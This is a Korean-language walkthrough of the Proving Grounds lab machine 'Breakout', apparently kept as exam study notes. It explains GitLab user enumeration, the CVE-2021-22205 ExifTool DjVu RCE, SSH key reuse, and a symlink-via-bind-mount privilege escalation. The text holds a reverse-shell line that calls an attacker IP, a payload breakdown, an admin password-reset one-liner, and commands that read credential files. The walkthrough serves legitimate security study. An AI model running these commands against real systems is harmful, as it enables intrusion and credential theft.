---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/file-upload
  - tech/exec/ssh-key
  - tech/payload/revshell
type: machine
platform: pg
os: linux
ip: 192.168.243.182
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2016-3714, CVE-2021-22204, CVE-2021-22205, CVE-2022-44268]
status: solved
manual_tags: true
tech_count: 3
---

> [!info] PG — Breakout
> 타겟 192.168.243.182 · OS Ubuntu 20.04.3 LTS (`breakout`, 5.4.0-90-generic) · **플래그 2개**
> **경로 요약** 80 GitLab → `/api/v4/users/<id>` 로 인증 없이 사용자 열거 → CVE-2021-22205(ExifTool DjVu, pre-auth RCE)로 컨테이너 안 `git` 셸 → `~/backups/mykey`(= `coaran` 개인키)로 SSH 재사용 → `local.txt` → 컨테이너의 `/var/log/gitlab` 이 호스트 `/srv/gitlab/logs` 바인드 마운트 임을 확인 → 로그 디렉터리에 `/root/.ssh/id_rsa` 심볼릭 링크 심기 → **호스트 root의 백업 zip 작업이 링크를 따라가 root 키를 압축** → root SSH → `proof.txt`

## 0. 이 박스에서 배우는 것

- **인증 없는 API 사용자 열거** — GitLab `/api/v4/users/<id>` 로 계정명을 통째로 뽑는다. 이후 SSH·키·비밀번호 재사용의 재료가 된다.
- **CVE-2021-22205 = "파일 업로드가 곧 RCE"** — 취약한 건 GitLab이 아니라 GitLab이 호출하는 ExifTool이다. 라이브러리 취약점이 상위 애플리케이션의 인증을 통째로 우회하는 전형.
- **키 재사용 (key reuse)** — 서비스 계정 홈에 굴러다니는 개인키의 주석 필드가 그 키의 주인을 알려준다. 열거로 얻은 사용자 목록과 맞춰서 수평 이동.
- **컨테이너 바인드 마운트가 신뢰 경계를 무너뜨린다** — 컨테이너 안에서 쓴 파일이 호스트 root 프로세스가 읽는 디렉터리에 그대로 나타난다.
- **심볼릭 링크 + 아카이버 = 임의 파일 읽기** — `zip`은 기본적으로 링크를 따라간다. 링크는 "경로 문자열"이고 읽는 쪽의 네임스페이스에서 해석된다. 이 두 문장이 이 박스 권한상승의 전부다.

> [!tip] 시험 출제 가능성
> **매우 높다.** 세 층 전부가 시험 단골이다.
> 1. **공개 CVE 있는 웹 제품(GitLab·Jenkins·Confluence·Gitea)의 pre-auth RCE** — PG/OSCP 박스의 가장 흔한 foothold.
> 2. **개인키 재사용으로 수평 이동** — "홈 디렉터리에서 키를 주웠다"는 시험에서 반드시 한 번은 나온다.
> 3. **크론/백업 작업이 내가 쓸 수 있는 디렉터리를 건드리는 권한상승** — 심링크·와일드카드·tar 옵션 주입 등 변형이 무궁하다. 이 계열은 [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] 와 같은 "크론 기반 권한상승" 패턴에 속한다.
>
> 변형 예상: 아카이버가 `tar`면 `-h` 없이는 링크를 안 따라가므로 와일드카드 인젝션(`--checkpoint-action`) 으로 바뀐다. `rsync`면 `-L` 여부가 갈린다. **"어떤 도구가 어떤 옵션으로 도는가"를 먼저 확인하는 습관**이 그대로 이식된다.

---

## 1. 정찰

### Nmap

```bash
┌──(kali㉿kali)-[~/PG/Breakout]
└─$ nnmap 192.168.243.182
Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-18 13:05 +0900
Nmap scan report for 192.168.243.182
Host is up (0.085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
80/tcp open  http    nginx
| http-robots.txt: 54 disallowed entries (15 shown)
| / /autocomplete/users /autocomplete/projects /search
| /admin /profile /dashboard /users /help /s/ /-/profile /-/ide/
|_/*/new /*/edit /*/raw
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.243.182/users/sign_in
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1025/tcp)
HOP RTT      ADDRESS
1   83.96 ms 192.168.45.1
2   83.79 ms 192.168.45.254
3   84.03 ms 192.168.251.1
4   84.31 ms 192.168.243.182

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.05 seconds
```

> [!warning] 기록된 명령줄(`nnmap 192.168.243.182`)은 실제로 돌린 명령이 아니다
> 출력이 **명령을 되짚어준다** — `Not shown: 65533 closed tcp ports` + 열린 2개 = 65535, 즉 `-p-` 전수 스캔이다. `VERSION` 컬럼 · `ssh-hostkey` NSE · `OS details` · `TRACEROUTE` 가 함께 있으니 `-sCV -A` 계열이 걸렸다.
> 재현 가능한 형태로는 이렇게 적어야 한다:
> ```bash
> sudo nmap -sCV -A -p- -Pn --min-rate 5000 -oN nmap.log 192.168.243.182
> ```
> 시험 노트에 명령을 오타·축약으로 남기면 다음에 그 노트가 나를 못 구한다. `-oN` 으로 파일에 남기는 습관이 이 문제를 원천 차단한다.

각 플래그가 이 출력에서 하는 일:

| 플래그 | 역할 | 빼면 |
|---|---|---|
| `-p-` | 1–65535 전수 | 기본 1000포트. 이 박스는 22·80이라 살아남지만, [[Hawat]]처럼 고번호 포트만 있는 박스는 시작조차 못 한다. 습관으로 붙여라 |
| `-sCV` | 기본 NSE + 버전 탐지 | `http-title: Sign in · GitLab` 이 안 나온다 → "nginx" 만 보고 GitLab을 놓친다 |
| `-A` | OS 탐지 + traceroute + `--script=default` | OS 추정과 홉 정보가 사라진다 |
| `--min-rate 5000` | 초당 최소 패킷 | 전수 스캔이 수십 분으로 늘어난다. 28초로 끝난 이유 |
| `-Pn` | ping 생략 | 랩 방화벽이 ICMP를 막으면 "Host seems down"으로 조기 종료 |

### 이 출력에서 실제로 중요한 줄

```
80/tcp open  http    nginx
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://192.168.243.182/users/sign_in
| http-robots.txt: 54 disallowed entries
```

- **`nginx` 는 제품명이 아니다.** GitLab Omnibus는 앞단에 nginx를 세운다. 서비스 배너만 보고 "정적 웹서버"로 판단하면 안 된다. `http-title`과 리다이렉트 목적지가 진짜 제품을 알려준다.
- **`robots.txt` 54줄**은 그 자체가 지문이다. `/-/profile` · `/-/ide/` · `/autocomplete/users` 같은 GitLab 고유 경로가 통째로 나온다. robots.txt는 "숨기는 목록"이 아니라 "존재 확인 목록" 이다.
- `/users/sign_in` 으로 302 → **인증 벽이 있다**는 뜻. 그래서 이 박스의 관건은 처음부터 "인증 전에 닿는 표면이 무엇인가" 였다.

> [!danger] nmap의 OS 추정(`MikroTik RouterOS 7.2 - 7.5`)은 오탐이다
> 실제 OS는 뒤에 SSH 배너와 로그인 메시지로 확정된다 — **Ubuntu 20.04.3 LTS / 5.4.0-90-generic**.
> 근거 2개를 교차했다:
> 1. `OpenSSH 8.2p1 Ubuntu 4ubuntu0.3` — 우분투 패키지 리비전이 배너에 박혀 있다(20.04 계열 고유)
> 2. SSH 로그인 후 `Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64)`
>
> **TCP/IP 스택 지문은 가상화·NAT·홉 4개를 지나면 쉽게 흔들린다.** "버전 판정은 독립 근거 2개" 원칙([[Hub]] · [[Levram]] · [[RubyDome]] · [[Astronaut]])이 OS 판정에도 그대로 적용된다.

### 열거 ① — 인증 없이 사용자 뽑기

GitLab은 **공개 인스턴스 전제**로 설계돼 있어 사용자 프로필 API가 기본적으로 익명에 열려 있다. 이 동작은 GitLab 자신도 오래 인지한 이슈다:

https://gitlab.com/gitlab-org/gitlab-foss/-/work_items/40158

api를 통해 유저 확인 가능
http://192.168.243.182/api/v4/users/1

```js
{
  "id": 1,
  "name": "Administrator",
  "username": "root",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/4924e448526fb188fd8e0c75d0dbb3bf?s=80&d=identicon",
  "web_url": "http://breakout/root",
  "created_at": "2022-03-03T18:32:40.659Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 2,
  "name": "webmaster",
  "username": "webmaster",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/92279a35ff837beb3ecc6ba7eeafb74e?s=80&d=identicon",
  "web_url": "http://breakout/webmaster",
  "created_at": "2022-03-03T18:35:07.902Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 3,
  "name": "michelle",
  "username": "michelle",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/fcf53cd37c1f86e2b43f1db402f41f52?s=80&d=identicon",
  "web_url": "http://breakout/michelle",
  "created_at": "2022-03-03T18:35:08.484Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

{
  "id": 4,
  "name": "Coaran",
  "username": "coaran",
  "state": "active",
  "avatar_url": "https://www.gravatar.com/avatar/4d92c43788f35237750720daeeb6297a?s=80&d=identicon",
  "web_url": "http://breakout/coaran",
  "created_at": "2022-03-03T18:35:08.705Z",
  "bio": "",
  "bio_html": "",
  "location": null,
  "public_email": "",
  "skype": "",
  "linkedin": "",
  "twitter": "",
  "website_url": "",
  "organization": null,
  "job_title": "",
  "bot": false,
  "work_information": null,
  "followers": 0,
  "following": 0
}

```

#### 이 열거를 한 줄로 자동화한다

```bash
for i in $(seq 1 30); do
  curl -s "http://192.168.243.182/api/v4/users/$i" \
    | grep -oE '"username":"[^"]+"'
done
```
또는 목록 엔드포인트를 직접:
```bash
curl -s 'http://192.168.243.182/api/v4/users?per_page=100' | jq -r '.[].username'
```
`/api/v4/users/<id>` 는 **없는 id면 `404 {"message":"404 User Not Found"}`** 를 준다. 유효/무효가 상태코드로 갈리므로 열거 종료 조건이 명확하다.

여기서 얻은 것을 **정보로 끝내지 말고 즉시 가설로 바꾼다**:

| 발견 | 파생 가설 |
|---|---|
| `root`(id 1) | GitLab 관리자. 인스턴스 장악 시 최우선 표적 |
| `webmaster`, `michelle`, `coaran` | 리눅스 로컬 계정과 이름이 겹칠 수 있다 → SSH 사용자명 후보 |
| `created_at: 2022-03-03` | 인스턴스 구축 시점 = 2022년 3월 당시 GitLab 버전. CVE 후보를 시대로 좁힌다 |
| `web_url: http://breakout/...` | 내부 호스트명이 `breakout`. `/etc/hosts` 에 추가해두면 리다이렉트가 안 깨진다 |

> [!warning] 스캐너 함정 — 디렉터리 브루트포싱은 GitLab에서 거의 무의미하다
> `gobuster`/`feroxbuster`를 GitLab에 걸면 **모든 경로가 302 → `/users/sign_in`** 으로 수렴한다. 유효/무효 구분이 안 되니 노이즈만 쌓인다.
> GitLab을 만나면 **디렉터리 퍼징 대신 (a) 버전 확정 → (b) 해당 버전의 pre-auth CVE 조회 → (c) `/api/v4/*` 익명 접근 점검** 순으로 간다. 시간을 10분 이상 아낀다.

### 열거 ② — 버전 확정

웹페이지 접근 시 버전 확인 가능
![[Pasted image 20260818141807.png]]

#### GitLab 버전을 인증 없이 얻는 경로

| 경로 | 비고 |
|---|---|
| 로그인 페이지 하단 푸터 | 이 박스에서 실제로 쓴 방법(위 스크린샷). CE는 관례적으로 버전을 노출한다 |
| `/help` | 버전에 따라 인증 요구. 열려 있으면 가장 정확 |
| `/api/v4/version` | 인증 필요. 익명으로는 401 — 여기서 막혔다고 포기하지 말 것 |
| `/assets/webpack/manifest.json`, 정적 자산 해시 | 버전이 가려졌을 때의 지문. 릴리스 간 해시가 다르다 |

**버전 판정은 독립 근거 2개** 원칙에 따라, 푸터로 얻은 버전은 뒤에 익스플로잇이 실제로 동작한 사실로 교차 확인된다(=취약 범위 안). 반대로 익스플로잇이 실패했다면 푸터를 의심했어야 한다.

---

## 2. 취약점 분석

이 박스는 **성격이 전혀 다른 취약점 두 개**를 이어 붙인 체인이다. 각각 따로 배워두면 다른 박스에서 독립적으로 재사용된다.

| # | 계층 | 취약점 | 얻는 것 |
|---|---|---|---|
| A | 웹 애플리케이션 | CVE-2021-22205 — GitLab이 호출하는 ExifTool의 코드 실행(CVE-2021-22204)이 인증 없는 업로드 경로로 노출 | 컨테이너 내부 `git` 셸 |
| B | 호스트 구성 | 컨테이너 바인드 마운트 + 아카이버의 심링크 추종 | 호스트 root 개인키 |

그 사이를 잇는 건 취약점이 아니라 **운영 실수** — 백업 디렉터리에 방치된 개인키(키 재사용)다.

---

### 2-A-0. 먼저 GitLab의 구조를 안다 — 셸이 왜 `git` 으로 떨어지는가

리버스셸이 붙은 프롬프트가 이랬다:

```
git@breakout:~/gitlab-workhorse$
```

이 한 줄에 GitLab Omnibus의 구조가 다 들어 있다. **어느 컴포넌트에서 코드가 돌았는지**를 알면 다음에 무엇을 찾아야 할지가 정해진다.

| 컴포넌트 | 역할 | 실행 사용자 |
|---|---|---|
| nginx | 리버스 프록시. 80/443 수신 | `gitlab-www` (root가 마스터) |
| Workhorse | **파일 업로드·다운로드 가로채기.** Rails가 큰 파일을 직접 다루지 않게 앞에서 처리 | `git` |
| Puma (Rails) | GitLab 본체 애플리케이션 | `git` |
| Sidekiq | 백그라운드 작업 큐 | `git` |
| Gitaly | Git 저장소 접근 전용 RPC 서버 | `git` |
| PostgreSQL / Redis | 데이터 저장 | `gitlab-psql` / `gitlab-redis` |

즉 **GitLab의 애플리케이션 계층은 전부 `git` 이라는 단일 서비스 계정으로 돈다.** 그래서:

- 업로드 → Workhorse(`git`) → Rails(`git`) → ExifTool(`git`) 이므로 **코드 실행 권한은 `git`** 이다. root가 아니다.
- 작업 디렉터리가 `~/gitlab-workhorse` 인 것은 **업로드 처리 경로에서 터졌다**는 직접 증거다.
- `git` 홈(`/var/opt/gitlab` 계열)에는 **저장소·설정·토큰·백업**이 모여 있다 → 여기부터 뒤진다. 이 박스에서 `~/backups/mykey` 가 나온 이유.

#### 셸을 잡았을 때 GitLab에서 먼저 뒤질 곳

```bash
ls -la ~ ; ls -la ~/backups 2>/dev/null
cat /etc/gitlab/gitlab.rb                 # 설정. 외부 URL·SMTP·LDAP 자격증명
cat /etc/gitlab/gitlab-secrets.json       # ← DB 암호화 키. 있으면 사실상 전부
ls -la /var/opt/gitlab/backups/           # 인스턴스 백업 tar
gitlab-rails runner 'puts User.first.email'   # git 권한이면 대개 실행된다
```
**`gitlab-rails console` 이 뜨면 게임이 끝난다** — 관리자 비밀번호를 임의로 바꿀 수 있다:
```ruby
u = User.find_by_username('root'); u.password='Passw0rd!23'; u.password_confirmation='Passw0rd!23'; u.save!
```
이 박스에서는 SSH 키가 더 빨랐지만, 웹 관리자 장악이 필요한 시나리오에서는 이 한 줄이 정답이다.

### 2-A-1. 배경 지식 — "메타데이터 정리"가 왜 RCE가 되는가

모르는 사람에게 설명하듯 처음부터.

사진 파일에는 픽셀 말고도 메타데이터(EXIF)가 붙는다. 촬영 기기·GPS 좌표·촬영 시각 같은 것들이다. 사용자가 아바타나 이슈 첨부로 이미지를 올리면, 개인정보 유출을 막기 위해 서버는 이 메타데이터를 지우거나 다시 쓴다. GitLab도 그렇게 한다 — 업로드된 이미지를 받아 **ExifTool**이라는 외부 프로그램에 넘겨 메타데이터를 정리한다.

여기서 두 가지가 겹친다.

**첫째, ExifTool은 Perl로 짜여 있고 아주 많은 포맷을 안다.** JPEG·PNG는 물론 PostScript, PDF, 그리고 DjVu(스캔 문서용 옛 포맷)까지 파싱한다. 그래서 ExifTool은 확장자를 믿지 않는다 — 파일 내용을 보고 포맷을 스스로 판정한다. `.jpg` 라는 이름이 붙어 있어도 안에 DjVu 구조가 들어 있으면 DjVu 파서가 돈다.

**둘째, DjVu의 주석(annotation) 청크 처리에 Perl `eval` 이 들어 있었다.** ExifTool 7.44–12.23의 DjVu 파서는 ANT 청크의 문자열을 해석하면서 `\c` 이스케이프를 처리하려고 문자열을 Perl 코드로 평가했다. 즉 파일 안의 텍스트가 서버에서 Perl 코드로 실행된다. 이것이 CVE-2021-22204다.

**GitLab이 한 실수는 이 두 개를 인증 앞단에 놓은 것이다.** GitLab에는 `POST /uploads/user` 라는 엔드포인트가 있는데, 이 경로는 로그인하지 않아도 파일을 받는다(원래 의도는 이슈 작성 중 임시 첨부 등). 받은 파일은 곧장 ExifTool로 간다. 결과적으로:

> **아무나 → 파일 하나 업로드 → GitLab 서버에서 임의 명령 실행.** 이것이 CVE-2021-22205다.

#### CVE 두 개의 관계를 헷갈리지 마라

| CVE | 어디의 결함 | 성격 |
|---|---|---|
| CVE-2021-22204 | ExifTool 7.44–12.23 | DjVu ANT 청크 → Perl `eval` → 코드 실행 |
| CVE-2021-22205 | GitLab CE/EE 11.9 ~ 13.8.8 / 13.9.6 / 13.10.3 미만 | 위 결함을 인증 없는 업로드 경로로 노출. CVSS 10.0 |

GitLab은 처음에 이 취약점을 "인증 필요"로 등급을 매겼다가 인증 없이도 된다는 사실이 밝혀진 뒤 10.0으로 올렸다. **"취약점 등급은 나중에 바뀐다"** — 오래된 취약점 요약을 그대로 믿지 마라.

#### 일반화 — 이런 신호를 보면 이렇게 접근한다

**"업로드한 파일을 서버가 열어서 처리한다"** 는 구조는 전부 같은 계열이다:
- 이미지 리사이즈 → ImageMagick(ImageTragick, `CVE-2016-3714`, MSL/MVG)
- 메타데이터 정리 → ExifTool(위)
- 썸네일/미리보기 → Ghostscript(`-dSAFER` 우회 계열)
- 문서 변환 → LibreOffice, `ffmpeg`(HLS/SSRF), `pdftotext`

업로드 기능을 만나면 **"업로드된 파일을 누가 파싱하는가"** 를 먼저 묻는다. 웹셸을 올릴 수 있는지(확장자 우회)보다 이쪽이 훨씬 자주 먹힌다.

### 2-A-2. 왜 취약한가 — 메커니즘

데이터 흐름을 따라가 보면 방어선이 하나씩 무력화된다.

```
[공격자]
  │ POST /uploads/user   (multipart/form-data, file=<이미지>)
  │ 인증 쿠키 없음 · CSRF 토큰만 필요
  ▼
[GitLab Workhorse]  ── 업로드 가로채기, 임시 파일로 저장
  │ 확장자 .jpg 로 왔으니 "이미지"로 취급
  ▼
[Rails: UploadedFile / 메타데이터 스크러빙]
  │ system("exiftool", ...) 로 외부 프로세스 호출
  ▼
[ExifTool (Perl)]
  │ ① 확장자 무시, 매직바이트로 포맷 재판정  → DjVu 로 인식
  │ ② DjVu ANT(annotation) 청크 파싱
  │ ③ "\c" 이스케이프 처리 과정에서 문자열을 eval()
  ▼
[Perl eval 안에서 system(...) 실행]  →  RCE (프로세스 소유자 = git)
```

핵심 결함을 한 줄씩 뜯으면:

| 지점 | 무엇이 잘못됐나 | 올바른 설계 |
|---|---|---|
| `POST /uploads/user` 가 익명 허용 | 공격 표면이 인증 앞으로 나온다 | 업로드는 로그인 이후로 제한 |
| GitLab이 확장자만 보고 이미지로 판단 | 실제 내용은 DjVu | 매직바이트 검증 + 허용 포맷 화이트리스트 |
| ExifTool이 자체적으로 포맷 재판정 | 호출자가 "JPEG만 처리해"라고 지시하지 않음 | `-fast2`, 포맷 강제 지정, 파서 축소 |
| DjVu 파서가 문자열을 `eval` | 데이터가 코드가 되는 고전적 실수 | 이스케이프 처리를 문자열 치환으로. `eval` 금지 |
| ExifTool이 웹 프로세스와 같은 권한으로 실행 | 코드 실행이 곧 앱 권한 탈취 | 샌드박스/별도 저권한 워커/seccomp |

DjVu 파일의 내부 구조를 알면 페이로드가 왜 그 모양인지 바로 이해된다. DjVu는 **IFF 계열의 청크 컨테이너**다 — `[4바이트 태그][4바이트 길이][데이터]` 가 반복된다:

```
AT&TFORM....DJVU
  ├─ INFO   폭·높이·DPI 같은 기본 정보          (필수)
  ├─ Sjbz   흑백 레이어 (실제 이미지 데이터)
  ├─ BG44   배경 레이어
  └─ ANTa / ANTz   ← 주석(annotation). ANTz 는 BZZ 압축본
        └─ "(metadata \"...\")"   ← 여기 문자열이 eval 로 들어간다
```

ExifTool의 DjVu 파서는 ANT 청크의 문자열을 읽어 **이스케이프 시퀀스를 풀어야** 한다. 그 구현이 문제였다 — 개념적으로 이런 모양이었다:

```perl
# ExifTool <= 12.23, DjVu 주석 파싱 (개념 재현)
$str =~ s/\\(.)/ eval "\"\\$1\"" /sge;   # ← 캡처한 내용을 그대로 eval
```

`\c` 를 만나면 `eval "\"\c...\""` 가 되고, Perl 문자열 안의 **`${ ... }` 는 코드 블록으로 평가**된다. 그래서 `${system('...')}` 이 실행된다.

| 방어선 | 왜 뚫렸나 |
|---|---|
| "이미지만 받는다" | 확장자만 검사 → JPEG 컨테이너 안에 DjVu를 실었다 |
| "ExifTool은 읽기만 한다" | 읽기 과정에 `eval` 이 있었다. 파싱은 수동적 행위가 아니다 |
| "메타데이터는 데이터일 뿐" | 이스케이프 처리를 코드 평가로 구현한 순간 데이터가 코드가 된다 |

#### "데이터를 코드로 평가한다"가 이 취약점의 본질이다

DjVu의 `\c` 이스케이프는 원래 **문자 코드 변환**이라는 단순한 기능이다. 그걸 구현하는 가장 게으른 방법이 `eval "\"$str\""` 였고, 그래서 `$str` 안에 `${system(...)}` 을 넣으면 Perl 문자열 보간이 그 코드를 실행한다.
같은 실수의 다른 이름들: PHP `eval()`/`preg_replace /e`, Python `pickle.loads`, Ruby `YAML.load`, Java `readObject`, JS `Function()`.
**"파서 안에서 eval/deserialize가 보이면 그 자리가 RCE다."** 시험에서 소스를 손에 넣으면 이 키워드부터 `grep` 한다.

### 2-A-3. 왜 이 페이로드인가 — 조각내기

익스플로잇 파일은 **"JPEG인 척하는 DjVu 안에 Perl 코드가 든 주석"** 이다. 세 겹이다.

```
out.jpg                       ← ① GitLab을 통과하기 위한 겉포장
 └─ EXIF 태그 0xc51b (HasselbladExif)
     └─ exploit.djvu          ← ② ExifTool이 재판정하는 실제 포맷
         └─ ANT 청크(BZZ 압축)
             └─ (metadata "\c${system('...')};")   ← ③ 실제로 실행되는 코드
```

| 조각 | 정확한 역할 | 빼면 어떻게 되나 |
|---|---|---|
| `.jpg` 확장자 / JPEG 컨테이너 | GitLab의 업로드 필터와 Workhorse를 통과 | 확장자 거부 또는 스크러빙 대상에서 제외 → ExifTool이 안 돈다 |
| EXIF 태그 `0xc51b` (HasselbladExif) | DjVu 데이터를 JPEG 안에 숨겨 넣는 운반체. 길이 제한이 느슨한 임의 바이너리 태그라 선택됨 | 다른 태그는 길이·타입 검증에 걸려 DjVu 구조가 깨진다 |
| DjVu ANT 청크 | ExifTool의 취약 파서를 깨우는 유일한 진입점 | INFO만 있는 DjVu는 그냥 파싱되고 끝. 코드가 안 돈다 |
| BZZ 압축(`bzz` 도구) | ANT 청크는 압축(`ANTz`) 형태를 쓴다. ExifTool이 풀어서 파싱 | 비압축 `ANTa`로도 가능하지만 파서 경로가 달라 실패할 수 있다 |
| `(metadata "...")` | DjVu 주석 문법. 이 구조여야 파서가 문자열로 인식 | 문법이 깨지면 파싱 중단 |
| `\c` | 취약한 이스케이프 처리 분기를 타게 하는 트리거 | 이게 없으면 `eval` 경로로 안 들어간다. **페이로드의 핵심 한 글자** |
| `${system('...')}` | Perl 문자열 보간 안에서 블록 실행. `$` 로 시작해야 보간된다 | 따옴표 밖이면 그냥 텍스트 |
| `bash -i >& /dev/tcp/LHOST/LPORT 0>&1` | 실제 리버스셸 | — |

원문에서 PoC가 만들어 보낸 명령이 로그에 그대로 찍혀 있다:

```
[*] command: bash -i >& /dev/tcp/192.168.45.207/4444 0>&1
```

#### `bash -i >& /dev/tcp/HOST/PORT 0>&1` 를 조각내면

| 조각 | 역할 |
|---|---|
| `bash -i` | 대화형 셸. 프롬프트가 나오고 job control을 시도한다 |
| `/dev/tcp/HOST/PORT` | bash 내장 가상 파일. 실제 파일이 아니라 bash가 여는 TCP 소켓. `nc` 없이 리버스셸이 되는 이유 |
| `>&` | stdout 과 stderr를 함께 소켓으로. `>` 만 쓰면 에러 메시지가 안 보인다 |
| `0>&1` | stdin을 소켓으로 되돌린다 = 명령 입력 채널. 이게 없으면 출력만 나오고 명령을 못 친다 |

**`sh` 로는 안 된다.** `/dev/tcp` 는 bash 고유 기능이라 dash/ash에서는 "No such file or directory"가 난다. 그래서 페이로드를 `bash -c "..."` 로 감싸는 관례가 생겼다.

---

### 2-A-4. 같은 계열 지도 — "서버가 내 파일을 파싱한다"

이 박스 하나로 끝내지 말고 계열 전체를 외워두면 다른 박스에서 즉시 재사용된다. 공통 조건은 하나다 — **내가 올린 바이트를 서버 측 파서가 해석한다.**

| 파서 | 대표 취약점 | 트리거 파일 | 확인 신호 |
|---|---|---|---|
| ExifTool | CVE-2021-22204 (Perl `eval`) | DjVu ANT (JPEG로 위장) | 업로드 후 EXIF가 지워져 있다 = ExifTool이 돈다 |
| ImageMagick | ImageTragick CVE-2016-3714, `PDF`/`MSL`/`MVG` delegate | `.mvg`/`.svg`/조작된 헤더 | 리사이즈·썸네일 기능, `Content-Type: image/*` 변환 |
| ImageMagick | CVE-2022-44268 (PNG 임의 파일 읽기) | tEXt `profile` 청크 | 변환된 PNG에 서버 파일 내용이 들어온다 |
| Ghostscript | `-dSAFER` 우회 계열 | `.eps`/`.ps`/PDF | PDF 미리보기·썸네일 |
| ffmpeg | HLS/SSRF·로컬 파일 읽기 | `.m3u8`/`.avi` | 동영상 업로드·트랜스코딩 |
| LibreOffice | 매크로/`WEBSERVICE` | `.odt`/`.docx`/`.xlsx` | 문서 → PDF 변환 |
| XML 파서 | XXE | `.svg`/`.docx`/`.xlsx` 내부 XML | 파일이 XML을 품고 있으면 항상 의심 |
| 아카이브 해제 | Zip Slip / 심링크 | `.zip`/`.tar` | **이 박스 4장과 같은 원리의 반대 방향** |

#### 업로드 기능을 만나면 던지는 질문 4개

1. **누가 이 파일을 여는가?** (파서 식별 — 응답 헤더, 변환 결과의 메타데이터, 에러 메시지)
2. **확장자·MIME 검사만 하는가, 내용도 보는가?** (매직바이트 위장이 통하는지)
3. **파일이 다시 나에게 돌아오는가?** (돌아오면 파일 읽기 취약점의 출력 채널이 된다 — CVE-2022-44268 계열)
4. **웹루트 안에 저장되는가?** (그러면 확장자 우회 웹셸이 더 빠른 경로다)

이 박스는 1번에서 "ExifTool"이 나오는 순간 끝난 것이다. **웹셸 확장자 우회로 30분 태우기 전에 파서를 먼저 물어라.**

### 2-B-1. 배경 지식 — 바인드 마운트가 신뢰 경계를 뚫는다

컨테이너는 격리 장치처럼 보이지만, 바인드 마운트를 뚫는 순간 격리가 아니다.

GitLab Omnibus를 도커로 돌리는 표준 방법이 바로 이것이다:

```yaml
volumes:
  - /srv/gitlab/config:/etc/gitlab
  - /srv/gitlab/logs:/var/log/gitlab
  - /srv/gitlab/data:/var/opt/gitlab
```

호스트의 디렉터리를 컨테이너 안에 그대로 얹는다. **컨테이너 안에서 쓴 파일이 호스트 파일시스템에 실제로 존재**하고, 그 반대도 마찬가지다. 컨테이너를 지워도 데이터가 남게 하려는 정당한 설계다.

문제는 **"컨테이너 안의 저권한 사용자"와 "호스트의 root"가 같은 디렉터리를 공유**하게 된다는 점이다. 컨테이너 안 `git` 이 쓴 파일을, 호스트의 root 크론이 읽는다.

원문에서 이 구조를 확인한 지점:

docker mount 확인
```bash
git@breakout:~/backups$ mount | grep gitlab
mount | grep gitlab
/dev/sda2 on /etc/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/log/gitlab type ext4 (rw,relatime)
/dev/sda2 on /var/opt/gitlab type ext4 (rw,relatime)
```

#### 이 3줄을 읽는 법 — "내가 컨테이너 안에 있다" 는 결정적 증거

정상적인 호스트라면 `/etc/gitlab` 이 별도 마운트일 이유가 없다. 그런데 **세 디렉터리가 각각 `/dev/sda2` 에서 따로 마운트**돼 있다.
이건 도커가 호스트 블록 디바이스의 서브트리를 bind mount 로 얹을 때 나타나는 전형적 모양이다 — 같은 디바이스가 여러 마운트 포인트에 반복된다.
즉 **`/var/log/gitlab` 아래에 쓰면 호스트의 어딘가에도 그 파일이 생긴다.**

컨테이너 판별 체크리스트(셸 잡으면 순서대로):
```bash
cat /proc/1/cgroup            # docker/kubepods 문자열
ls -la /.dockerenv            # 존재하면 도커
mount | grep -E 'overlay|/dev/sd'   # overlay 루트 + bind mount 조합
cat /etc/hostname             # 12자리 hex면 컨테이너 기본값
ip a                          # 172.17.x.x = docker0 기본 브리지
```

### 2-B-2. 왜 취약한가 — 링크는 "경로 문자열"이고, 해석은 읽는 쪽이 한다

여기가 이 박스의 진짜 핵심이다. 세 문장으로 압축된다.

1. **심볼릭 링크는 파일이 아니라 경로 문자열이다.** `ln -s /root/.ssh/id_rsa keykey` 는 `keykey` 라는 이름표에 `"/root/.ssh/id_rsa"` 라는 17바이트 문자열을 저장할 뿐이다. 만드는 시점에 대상이 존재할 필요도, 읽을 권한이 있을 필요도 없다.
